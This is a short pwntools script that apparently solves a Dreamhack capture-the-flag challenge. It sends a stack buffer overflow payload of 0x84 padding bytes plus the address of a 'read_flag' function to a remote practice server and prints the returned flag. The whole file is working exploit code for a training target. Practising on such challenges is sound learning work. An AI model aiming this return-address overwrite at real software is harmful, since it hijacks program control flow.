from pwn import *


def main():
    elf = ELF("./basic_exploitation_001")
    read_flag = elf.symbols["read_flag"]

    proc = remote("host1.dreamhack.games", 19456)

    payload = b"A" * 0x84
    payload += p32(read_flag)

    proc.sendline(payload)
    flag = proc.recv().decode()
    log.success(f"{flag = }")


if __name__ == "__main__":
    main()
